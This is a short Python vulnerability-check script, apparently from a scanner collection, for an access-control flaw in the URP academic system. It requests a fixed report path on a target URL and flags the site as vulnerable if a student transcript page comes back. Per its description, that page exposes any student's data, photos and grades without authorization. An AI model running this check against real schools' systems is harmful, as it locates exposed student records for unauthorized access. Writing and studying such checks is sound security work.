#!/usr/bin/env python
# -*- coding: utf-8 -*- 
'''
name: urp查询接口曝露
referer: http://www.wooyun.org/bugs/wooyun-2010-025424
author: Lucifer
description: urp查询接口未设置权限，可以越权查询任意学生信息，照片，成绩等
'''
import sys
import requests
import warnings
def run(url):
        result = ['urp查询接口曝露','','']
        payload = "/reportFiles/cj/cj_zwcjd.jsp"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"成绩单" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

